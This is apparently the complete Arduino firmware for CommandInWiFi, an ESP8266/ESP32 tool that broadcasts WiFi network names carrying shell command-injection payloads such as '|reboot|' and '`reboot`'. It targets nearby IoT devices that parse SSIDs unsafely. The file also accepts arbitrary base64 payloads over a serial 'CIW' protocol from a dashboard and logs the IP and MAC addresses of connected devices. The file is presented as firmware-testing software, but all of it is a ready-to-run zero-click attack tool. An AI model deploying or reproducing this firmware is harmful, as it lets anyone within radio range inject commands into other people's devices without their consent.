/*
   Project Name: CommandInWiFi
   Description: Zero-click SSID injection tool. Broadcasts malicious WiFi SSIDs
   from an ESP8266/ESP32 to test IoT device firmware parsing vulnerabilities.
   Supports CIW serial protocol for remote payload deployment from dashboard.
*/

#ifdef ESP32
  #include <WiFi.h>
  #include <esp_wifi.h>
#else
  #include <ESP8266WiFi.h>
  #include <ESP8266WiFiType.h>
#endif

// ── Default SSIDs (used when no payloads pushed via serial) ─────────────
const char* defaultSSIDs[] = {"|reboot|", "&reboot&", "`reboot`", "$reboot$"};
const int defaultCount = sizeof(defaultSSIDs) / sizeof(defaultSSIDs[0]);

// ── Dynamic payload queue (filled via CIW serial protocol) ──────────────
#define MAX_PAYLOADS 64
String payloadQueue[MAX_PAYLOADS];
int queueCount = 0;
bool isRunning = false;
bool useDashboard = false;  // true once first CIW command received

// Open AP (no password) — SSIDs must be visible to all scanning devices
// Index to track the current SSID
unsigned int ssidIndex = 0;

// Timers
unsigned long lastChangeMillis = 0;
unsigned long lastDeviceListMillis = 0;
const long ssidChangeInterval = 2 * 60 * 1000; // 2 minutes
const long deviceListInterval = 60 * 1000;      // 1 minute

// Serial command buffer
String serialBuffer = "";

// ── Base64 decode (minimal, no external library needed) ─────────────────
static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int b64index(char c) {
  if (c == '=') return 0;
  for (int i = 0; i < 64; i++) {
    if (b64chars[i] == c) return i;
  }
  return -1;
}

String b64decode(const String &input) {
  String output = "";
  int len = input.length();
  for (int i = 0; i < len; i += 4) {
    int a = b64index(input[i]);
    int b = (i + 1 < len) ? b64index(input[i + 1]) : 0;
    int c = (i + 2 < len) ? b64index(input[i + 2]) : 0;
    int d = (i + 3 < len) ? b64index(input[i + 3]) : 0;

    output += (char)((a << 2) | (b >> 4));
    if (i + 2 < len && input[i + 2] != '=')
      output += (char)(((b & 0x0F) << 4) | (c >> 2));
    if (i + 3 < len && input[i + 3] != '=')
      output += (char)(((c & 0x03) << 6) | d);
  }
  return output;
}

// ── Setup ───────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  while (!Serial) { ; }
  Serial.println("CIW:BOOT");
#ifdef ESP32
  Serial.println("CommandInWiFi v2.0 (ESP32) — CIW Protocol Ready");
#else
  Serial.println("CommandInWiFi v2.0 (ESP8266) — CIW Protocol Ready");
#endif
  Serial.println("Waiting for dashboard commands or using default SSIDs...");

  WiFi.mode(WIFI_AP);
  changeSSID();
  isRunning = true;
  Serial.println("Setup completed. Broadcasting default SSIDs.");
}

// ── Main Loop ───────────────────────────────────────────────────────────
void loop() {
  unsigned long currentMillis = millis();

  // Always check for serial commands (non-blocking)
  checkSerialCommand();

  // SSID cycling
  if (isRunning && currentMillis - lastChangeMillis >= ssidChangeInterval) {
    lastChangeMillis = currentMillis;
    changeSSID();
  }

  // Device listing
  if (currentMillis - lastDeviceListMillis >= deviceListInterval) {
    lastDeviceListMillis = currentMillis;
    listConnectedDevices();
  }
}

// ── CIW Serial Protocol Handler ─────────────────────────────────────────
void checkSerialCommand() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      serialBuffer.trim();
      if (serialBuffer.length() > 0) {
        processCommand(serialBuffer);
      }
      serialBuffer = "";
    } else {
      serialBuffer += c;
    }
  }
}

void processCommand(const String &cmd) {
  if (cmd == "CIW:CLEAR") {
    queueCount = 0;
    ssidIndex = 0;
    useDashboard = true;
    Serial.println("CIW:OK:CLEAR");

  } else if (cmd.startsWith("CIW:ADD:")) {
    if (queueCount >= MAX_PAYLOADS) {
      Serial.println("CIW:ERR:Queue full (max " + String(MAX_PAYLOADS) + ")");
      return;
    }
    String b64 = cmd.substring(8);
    String decoded = b64decode(b64);
    payloadQueue[queueCount] = decoded;
    queueCount++;
    useDashboard = true;
    Serial.println("CIW:OK:ADD:" + String(queueCount - 1));

  } else if (cmd == "CIW:START") {
    if (getActiveCount() == 0) {
      Serial.println("CIW:ERR:No payloads in queue");
      return;
    }
    isRunning = true;
    ssidIndex = 0;
    lastChangeMillis = millis();
    useDashboard = true;
    changeSSID();
    Serial.println("CIW:OK:START:" + String(getActiveCount()));

  } else if (cmd == "CIW:STOP") {
    isRunning = false;
    Serial.println("CIW:OK:STOP");

  } else if (cmd == "CIW:STATUS") {
    String state = isRunning ? "running" : "stopped";
    Serial.println("CIW:STATUS:" + state + ":" + String(getActiveCount()) + ":" + String(ssidIndex));

  } else {
    Serial.println("CIW:ERR:Unknown command");
  }
}

// ── Get active payload count ────────────────────────────────────────────
int getActiveCount() {
  return useDashboard ? queueCount : defaultCount;
}

// ── Change SSID ─────────────────────────────────────────────────────────
void changeSSID() {
  int count = getActiveCount();
  if (count == 0) return;

  const char* newSSID;
  String dynamicSSID;

  if (useDashboard && queueCount > 0) {
    dynamicSSID = payloadQueue[ssidIndex % queueCount];
    newSSID = dynamicSSID.c_str();
  } else {
    newSSID = defaultSSIDs[ssidIndex % defaultCount];
  }

  WiFi.softAP(newSSID);

  Serial.println("-------------------------------------------------");
  Serial.print("CIW:SSID:");
  Serial.println(newSSID);
  Serial.print("SSID Changed: ");
  Serial.print(newSSID);
  Serial.print(" | Index: ");
  Serial.print(ssidIndex);
  Serial.print(" | Time: ");
  Serial.print(millis() / 1000);
  Serial.println("s");

  ssidIndex = (ssidIndex + 1) % count;
}

// ── List connected devices ──────────────────────────────────────────────
void listConnectedDevices() {
  Serial.println("-------------------------------------------------");
  Serial.println("Listing Connected Devices:");

#ifdef ESP32
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;

  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  if (adapterList.num == 0) {
    Serial.println("No devices connected.");
    return;
  }

  for (int i = 0; i < adapterList.num; i++) {
    tcpip_adapter_sta_info_t station = adapterList.sta[i];
    String ip = IPAddress(station.ip.addr).toString();
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             station.mac[0], station.mac[1], station.mac[2],
             station.mac[3], station.mac[4], station.mac[5]);
    Serial.print("Device - IP: ");
    Serial.print(ip);
    Serial.print(", MAC: ");
    Serial.println(mac);
    Serial.println("CIW:DEVICE:" + ip + ":" + String(mac));
  }
#else
  struct station_info *station_list = wifi_softap_get_station_info();

  if (station_list == NULL) {
    Serial.println("No devices connected.");
  }

  while (station_list != NULL) {
    String ip = IPAddress((&station_list->ip)->addr).toString();
    String mac = macToString(station_list->bssid);
    Serial.print("Device - IP: ");
    Serial.print(ip);
    Serial.print(", MAC: ");
    Serial.println(mac);
    Serial.println("CIW:DEVICE:" + ip + ":" + mac);
    station_list = STAILQ_NEXT(station_list, next);
  }
  wifi_softap_free_station_info();
#endif
}

#ifndef ESP32
String macToString(const uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}
#endif
